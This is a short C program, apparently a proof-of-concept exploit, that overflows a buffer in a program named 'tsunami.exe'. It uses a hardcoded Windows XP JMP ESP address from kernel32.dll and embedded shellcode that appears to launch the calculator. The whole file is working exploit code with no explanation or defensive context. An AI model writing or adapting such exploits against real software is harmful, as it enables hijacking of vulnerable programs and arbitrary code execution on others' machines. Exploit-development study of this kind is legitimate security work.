#include <stdio.h>
#include <stdlib.h>

int main (int argc, char **argv) {

char evilbuffer[512]="AAAABBBB";

char offset[]="\x7B\x46\x86\x7C"; //x7C86467B en Windows XP SP (JMP ESP kernel32.dll)

char shellcode[]="\xeb\x0e\xba\xad\x23\x86\x7c\xff\xd2\xba\xfa\xca\x81\x7c\xff\xd2\xe8\xed\xff\xff\xff\x63\x61\x6c\x63\x00";

strcat(evilbuffer,offset);
strcat(evilbuffer,shellcode);

argv[0] = "vuln1";
argv[1] = evilbuffer;
argv[2] = NULL;

execv("tsunami.exe",argv);
}

